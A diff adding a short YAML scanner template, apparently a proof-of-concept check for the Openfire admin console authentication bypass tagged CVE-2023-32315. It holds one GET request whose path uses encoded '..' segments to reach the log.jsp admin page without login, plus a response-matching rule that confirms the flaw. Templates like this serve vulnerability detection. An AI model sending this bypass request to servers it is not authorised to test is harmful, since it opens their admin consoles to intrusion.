@@ -1,0 +1,17 @@
+id: poc-yaml-openfire-admin-console-auth-bypass
+info:
+  name: Openfire 管理控制台认证绕过
+  severity: high
+  tags:
+  - CVE-2023-32315
+  - 两高一弱
+  finger: Openfire
+requests:
+- method: GET
+  rawPath: /setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
+  expression: 'status_code == 200 && (title == "error" || title == "openfire.log")
+    &&  contains(body, "class=\"head-num\"")
+
+    '
+variables: {}
+transport: http
